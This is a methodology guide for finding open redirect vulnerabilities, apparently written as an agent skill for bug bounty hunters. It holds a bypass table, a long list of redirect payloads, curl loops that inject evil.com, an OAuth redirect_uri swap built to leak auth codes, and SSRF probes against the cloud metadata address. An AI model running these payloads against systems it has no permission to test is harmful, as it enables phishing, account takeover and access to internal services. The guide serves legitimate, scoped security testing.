---
name: open-redirect
description: Hunt Open Redirect vulnerabilities — reflected and path-based redirects, parameter and header injection, bypass table, OAuth/SSO chain to ATO, phishing chains, SSRF escalation, browser-differential bypasses. Use when testing redirect parameters (url, redirect, next, return, returnTo, continue, dest, destination, callback, redir, redirect_uri, checkout_url, success_url, logout), path-based redirects, OAuth flows, login/logout/signup/password-reset, or building ATO chains. Covers detection, bypass payloads, validation, severity, and reporting.
sources: hackerone_public
report_count: 13
---

# OPEN-REDIRECT — Open Redirect

## What it is

An Open Redirect happens when a web application redirects a user to a URL controlled by user input without proper validation. The attacker crafts a link that *starts with a trusted domain* but lands the victim on an attacker-controlled page, enabling phishing, OAuth token theft, and SSRF escalation.

```
https://target.com/redirect?url=https://evil.com
# If the response Location: https://evil.com (or the browser lands there) → vulnerable
```

**Severity baseline:** Open redirect alone is almost always **Low**. It becomes **Medium/High/Critical** only when chained (OAuth auth-code theft → ATO, server-side redirect → SSRF, session fixation). Never inflate. Some programs explicitly mark open redirects Out of Scope unless chained — check the program policy first.

---

## Where to find (high-value surfaces)

- Login / Logout (often `?next=`, `?returnTo=`, `?rurl=`, `?redirect=`)
- Signup / registration redirects
- Password reset flows
- OAuth / SSO / third-party auth (`redirect_uri`, `next`, `state`-adjacent)
- Payment gateways (`checkout_url`, `success_url`, `cancel_url`, `return_url`)
- Email verification links
- Path-based redirects (server rewrites `/<path>` → Location)
- Proxy/fetch endpoints that follow redirects server-side (SSRF escalation)

---

## Common parameters

```
?url=            ?redirect=        ?next=           ?return=
?returnTo=       ?continue=       ?dest=           ?destination=
?callback=       ?go=             ?forward=        ?location=
?target=         ?redir=          ?redirect_uri=   ?checkout_url=
?success_url=    ?cancel_url=     ?redir=          ?to=
?logout=         ?rurl=           ?uurl=           ?out=
?link=           ?jump=           ?view=           ?ref=
```

Examples from real reports:
```
/login?next=https://evil.com
/logout?returnTo=///evil.com/
/signup?enable_registration=true&uurl=...@evil.com
/accounts/login/github/?next=///google.com
/oauth/authorize?redirect_uri=https://evil.com/auth/...
/redirect?url=http://bing.com
```

---

## Attack surface discovery

```bash
# 1. Collect URLs (prior recon/crawl)
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
# 2. Catch less common param names
grep -Ei "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout|rurl|uurl|redir|continue)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
sort -u -o recon/$TARGET/redirect-candidates.txt recon/$TARGET/redirect-candidates.txt

# 3. Path-based: any path that 301/302s
cat recon/$TARGET/httpx.txt | awk '{print $1}' | while read u; do
  curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 "$u" | grep -E "30[1278]"
done
```

Also inspect JS for client-side sinks:
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
# DOM-based open redirect: https://target/page#https://evil.com  or ?url=...
```

---

## Bypass table (from real reports + payload list)

| Technique | Payload | Report |
|---|---|---|
| Basic | `https://evil.com` | #311330 (Semrush) |
| Protocol-relative | `//evil.com` | #692154 (Vend) |
| Triple slash | `///evil.com` | #223326 (Weblate), #76738 (Zaption) |
| Backslash bypass | `/\\evil.com` | #2812583 (Tumblr) |
| At-sign confusion | `https://target.com@evil.com` | #2812583 |
| Backslash + at-sign | `https://evil.com\@target.com` | #2812583 |
| URL-encoded slash | `%2Fevil.com`, `/%2f%2f%2fbing.com/...` | #504751 (Omise) |
| URL-encoded dot | `google%2Ecom` | #311330 |
| Double encoding | `%252E`, `%252f` | #311330, #57163 (HackerOne) |
| Full percent-encoding | `http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D` | #311330 |
| Null byte | `evil.com%00target.com` | bypass table |
| Whitespace/tab/newline | `evil.com%09`, `%0a`, `%0d%0a//evil.com` | bypass table |
| Path-based redirect | `https://target.com/%2Fgoogle.com`, `https://target.com//google.com/` | #57163, #504751 |
| Path-based + query confusion | `https://target.com///bing.com/?target.com/?...` | #1213580 (Affirm) |
| Chained intermediary (trusted domain) | `https://victim.com/logout?return_url=https://checkout.shopify.com/<attacker_store_id>` | #159522 (Shopify) |
| Nested redirect param | `?redir=llink?url=https://twitter.com/` | #16718 (Slack) |
| OAuth redirect_uri swap | `redirect_uri=https://example.com/auth/...` | #3099816 (Lichess) |
| Browser differential | works in Firefox, blocked in Chrome (URL-encoding not normalized) | #1788006 (Expedia) |
| Trailing slash handling | `https://target.com//evil.com/` | #692154 (Vend) |

### Full payload list (bing.com as canary)

```
https://bing.com
https://bing.com/%2F
https://bing.com////
bing.com
//bing.com
/%0A/bing.com
/%0D/bing.com
/%09/bing.com
/+/bing.com
///bing.com
\\\\bing.com
/\\/bing.com/
https://bing.com/%2e%2e
https://bing.com/%2f..
https://bing.com/%09
https://bing.com/%0a
%0d%0a//bing.com
%0d%0a\\\\bing.com
%2fbing.com
/%2f%2fbing.com
/%252fbing.com
/%2e%2e/bing.com
/%2f..%2fbing.com
/%2f%2e%2e%2fbing.com
/%2f%2f%2f%2fbing.com
http://bing.com
/\\/bing.com
%2f%2fbing.com
%252f%252fbing.com
https:bing.com
https:///bing.com
/..\\bing.com
/..%2fbing.com
/http://bing.com
/http:/bing.com
/https:/%5cbing.com/
/https://%09/bing.com
/https://%5cbing.com
/https:///bing.com/%2e%2e
/https:///bing.com/%2f%2e%2e
/https://bing.com
/https://bing.com/
/https://bing.com/%2e%2e
/https://bing.com/%2e%2e%2f
/https://bing.com/%2f%2e%2e
/https://bing.com/%2f..
/https://bing.com//
/https:bing.com
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cbing.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.bing.com
//%09/bing.com
//%5cbing.com
///%09/bing.com
///%5cbing.com
////%09/bing.com
////%5cbing.com
/////bing.com
/////bing.com/
////\\;@bing.com
////bing.com/
https://bing.com\@
bing.com\@
```

Use a **canary you control** (Burp Collaborator / your own domain) instead of `bing.com` when validating, so you can prove the victim actually landed on attacker infrastructure.

---

## Step-by-step hunting methodology

### Phase 1 — Basic test (parameter redirect)

```bash
COLLAB="https://YOUR-COLLAB.example"   # or https://evil.com
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

Also test the raw host/path forms:
```bash
curl -s -I --max-redirs 0 "https://$TARGET//evil.com/"
curl -s -I --max-redirs 0 "https://$TARGET/%2Fevil.com"
```

### Phase 2 — Bypass matrix

```bash
BASE="https://$TARGET/redirect?url="
for P in "https://evil.com" "//evil.com" "///evil.com" "/\\evil.com" \
         "https://$TARGET@evil.com" "https://evil.com%23.$TARGET" \
         "https://evil.com%09" "%2F%2Fevil.com" "%252f%252fevil.com" \
         "https:evil.com" "https:///evil.com" "/..%2fevil.com"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE}${P}" | grep -i "^location:")
  echo "$P  ->  $LOC"
done
```

Always re-test with the **browser** too — curl does not normalize URLs the way browsers do (Expedia #1788006). A payload that "fails" in curl may redirect in Firefox/Chrome.

### Phase 3 — DOM-based open redirect

```bash
# Find candidate sinks in JS
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
```
Confirm in a browser:
```
https://target.com/page#https://evil.com
https://target.com/page?url=https://evil.com
```
Common shape: `var u = new URLSearchParams(location.search).get('url'); location = u;`

### Phase 4 — OAuth / SSO chain (highest value)

```bash
# Find OAuth authorize endpoints
grep -i "oauth\|authorize\|redirect_uri\|sso\|callback" recon/$TARGET/urls.txt | head -40

# Swap redirect_uri to an attacker domain (or an open redirect on the trusted domain)
OAUTH="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com/cb" 2>&1 | grep -i "location:"
# Stronger: redirect_uri = open redirect on trusted domain → auth code leaks to attacker
curl -sv "$OAUTH?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

**Watch for consent screens** (Lichess #3099816): the provider may show the `redirect_uri` and ask the user to authorize. Even then, subtle domain typos (`lichess45455.com`) can phish. Note whether a confirmation screen exists and whether it can be bypassed.

### Phase 5 — Server-side redirect → SSRF escalation

If the app fetches the redirect target server-side (follows 302s), an open redirect becomes SSRF:

```bash
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" -H "Cookie: $SESSION"
```

### Phase 6 — Trusted-intermediary chain (Shopify pattern)

Look for redirects through a *trusted* host that itself honors a user-controlled destination:
```
victim.com/logout?return_url=https://trusted.com/<id>   (trusted.com then redirects to attacker URL stored under <id>)
```
Test any `return_url`/`checkout_url` that points at a first-party subdomain or checkout host.

---

## Automation

```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t http/cves/... 2>/dev/null
nuclei -u https://$TARGET -tags redirect -severity low,medium,high

# gf + qsreplace + curl
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}

# open-redirect-scanner style: param mining
grep -rhoE "[?&](url|redirect|next|return|returnTo|continue|dest|destination|callback|go|forward|location|target|redir|to|checkout_url|success_url|cancel_url|redir|rurl|uurl)=[^&]*" \
  recon/$TARGET/urls.txt | sort -u
```

---

## Validation (prove it, don't assume)

✅ `Location` response header points to your controlled domain **or** the browser actually navigates there.
✅ Reproduce in a real browser (curl normalization differs — Expedia #1788006).
✅ For DOM-based: confirm the navigation happens client-side.
✅ For OAuth: show the auth code / token actually reaches attacker infrastructure (use a canary you control; never steal real tokens).
✅ For SSRF chain: show an internal/metadata response.
✅ For phishing chain: show the URL starts with the trusted domain but lands on attacker page.

**False-positive traps:**
- Redirects that show a warning/confirmation screen (Lichess) — may be considered not-a-vuln.
- Redirects only to same-origin/allowlisted hosts.
- Redirects that require authentication and only redirect after login to a fixed path.
- Programs that explicitly list open redirects as Out of Scope unless chained (Vend initially N/A; Shopify chained accepted).

---

## Chain table

| Open redirect finding | Chain to | Impact |
|---|---|---|
| Any open redirect | OAuth `redirect_uri` bypass | Auth code theft → ATO (High/Critical) |
| Any open redirect | Phishing URL with trusted domain | Social engineering (Low-Medium) |
| Server-side redirect | SSRF via followed redirect | Internal service access (High) |
| Logout redirect | Session fixation | Force login with known session (Medium) |
| Trusted-intermediary redirect | Stored malicious destination | Mass phishing (Medium-High) |
| Path-based redirect | Cache poisoning / WAF bypass | Varies |

---

## Severity guide

- Redirect alone: **Low** (most programs)
- Chains to OAuth code theft → ATO: **High/Critical**
- Phishing with brand name: **Low-Medium**
- Server-side → SSRF: **High**
- OAuth with consent screen only (no bypass): usually **not accepted** or Low

---

## Reporting notes (human tone, impact-first)

- Title formula: `Open Redirect via <param> on <endpoint> leading to <impact>`
- Always state whether it's reflected (param) or path-based.
- Include the exact PoC URL, the `Location` header, and a browser screenshot/video.
- For bypasses, list which normalization difference (curl vs Firefox vs Chrome) makes it work.
- For OAuth chains, include the modified `redirect_uri` and proof the code lands on attacker infra.
- Redact cookies/tokens/PII in evidence (see evidence-hygiene).
- Check program scope: some programs reject bare open redirects; lead with the chain.

---

## Real-world anchors (from disclosed reports)

- #1028345 HackerOne — open redirect (disclosed)
- #1213580 Affirm — `///google.com/?www.affirm.com/...` ($250, Low)
- #159522 Shopify — chained via checkout.shopify.com store redirect (Medium chain)
- #16718 Slack — `?redir=llink?url=https://twitter.com/` ($100)
- #1788006 Expedia — `?logout=` browser differential Firefox vs Chrome (Medium)
- #223326 Weblate — `?next=///google.com` in third-party auth (Medium)
- #2812583 Tumblr — `?redirect_to=https://evil.com\@www.tumblr.com` (Low)
- #3099816 Lichess — OAuth `redirect_uri` swap (duplicate, consent screen)
- #311330 Semrush — `/redirect?url=` with multiple encoding bypasses (Low)
- #504751 Omise — `/%2f%2f%2fbing.com/%3fwww.omise.co/` path-based ($100, Low)
- #57163 HackerOne — `/%2Fgoogle%252Ecom` double-encoded dot
- #692154 Vend — `//evil.com/` trailing slash (Medium, initially OOS)
- #76738 Zaption — `///evil.com/` and `http:///evil.com/` filter bypass
